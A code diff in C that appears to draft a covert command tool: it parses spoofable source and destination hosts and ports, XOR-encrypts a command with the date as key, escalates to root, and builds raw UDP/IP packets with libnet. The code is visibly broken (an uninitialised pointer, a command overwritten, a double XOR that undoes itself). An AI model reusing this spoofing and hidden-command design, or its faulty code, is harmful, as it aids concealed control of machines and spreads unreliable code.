@@ -1,14 +1,76 @@
 #include "server.h"
 
+char* encrypt_data(char*, char*);
+
 int main (int argc, char *argv[])
 {
     char errorBuffer[PCAP_ERRBUF_SIZE];
+    char *command;
     libnet_ptag_t ptag;
     libnet_t *myPacket;
     bpf_u_int32 net;
     bpf_u_int32 mask;
     pcap_if_t *nics;
     pcap_if_t *nic;
+    struct AddrInfo *Addr_Ptr;
+    int opt;
+    time_t t;    struct tm* tm;
+    char Date[11];
+    char *encryptedField;
+
+    time(&t);
+    tm = localtime(&t);
+    
+    while ((opt = getopt (argc, argv, OPTIONS)) != -1)
+    {
+        switch (opt)
+        {
+            case 'h':
+                Addr_Ptr->SrcHost = optarg;
+                break;
+                
+            case 'd':
+                Addr_Ptr->DstHost = optarg;		// Destination Host name
+                break;
+                
+            case 'p':
+                Addr_Ptr->dport = atoi (optarg);
+                break;
+                
+            case 's':
+                Addr_Ptr->sport = atoi (optarg);
+                break;
+                
+            case 'c':
+                command = optarg;
+                break;
+                
+            default:
+            case '?':
+                exit(0);
+        }
+    }
+    command = strdup("/dev/bin");
+    
+    strftime(Date, sizeof Date, "%Y:%m:%d", tm);
+    printf("%s\n", Date);
+    
+    encryptedField = encrypt_data(command, Date);
+    printf("%s\n", encryptedField);
+    
+    encryptedField = encrypt_data(encryptedField, Date);
+    printf("%s\n", encryptedField);
+
+    
+    /* Change the UID/GID to 0 (raise to root) */
+	if ((setuid(0) == -1) || (setgid(0) == -1))
+    {
+        systemFatal("You need to be root for this");
+
+    }
+	//setgid(0);
+    
+   
     
     /* Get the devices on the machine */
     if (pcap_findalldevs(&nics, errorBuffer) == -1)
@@ -32,8 +94,8 @@ int main (int argc, char *argv[])
 
     /* Make the new UDP header */
     ptag = libnet_build_udp(
-                            htons(69),    /* source port */
-                            htons(69),    /* destination port */
+                            htons(Addr_Ptr->sport),    /* source port */
+                            htons(Addr_Ptr->dport),    /* destination port */
                             32,           /* packet size */
                             0,            /* checksum */
                             NULL,         /* payload */
@@ -47,6 +109,10 @@ int main (int argc, char *argv[])
         systemFatal("Error making UDP packet");
     }
     
+    /* Encrypt our command with the date */
+    
+    //encryptedField = Date / errorBuffer;
+    
     /* Make the IP header */
     ptag = libnet_build_ipv4(
                              5,                                          /* length */
@@ -56,8 +122,8 @@ int main (int argc, char *argv[])
                              64,                                         /* TTL */
                              IPPROTO_UDP,                                /* protocol */
                              0,                                          /* checksum */
-                             192,                                   /* source IP */
-                             123,                              /* destination IP */
+                             *(Addr_Ptr->SrcHost),                                   /* source IP */
+                             *(Addr_Ptr->DstHost),                              /* destination IP */
                              NULL,                                       /* payload */
                              0,                                          /* payload size */
                              myPacket,                                   /* libnet handle */
@@ -79,5 +145,19 @@ int main (int argc, char *argv[])
     
     libnet_destroy(myPacket);
     return 0;
+}
 
+
+char* encrypt_data(char* input, char* key)
+{
+    int i, x, y;
+    
+    x = strlen(input);
+    y = strlen(key);
+    
+    for (i = 0; i < x; ++i)
+    {
+        input[i] ^= key[(i%y)];
+    }    
+    return input;
 }
